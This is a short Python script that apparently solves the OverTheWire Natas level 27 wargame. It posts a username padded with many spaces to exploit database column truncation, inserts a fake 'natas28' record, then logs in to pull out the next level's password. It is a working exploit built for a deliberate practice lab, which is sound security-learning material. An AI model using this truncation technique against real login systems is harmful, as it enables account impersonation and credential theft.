#!/usr/bin/env python
import requests

target = 'http://natas27.natas.labs.overthewire.org/index.php'
auth = ('natas27','<redactred>')

print '[+] Starting..'

r = requests.post(target, auth=auth, data=dict(username='natas28' + ' ' * 70 + 'multi', password=''))
print '[+] Inserting false record..'

r = requests.post(target, auth=auth, data=dict(username='natas28', password=''))
print '[+] Key received - natas28:' + r.content[907:939]

print '[+] Complete..'
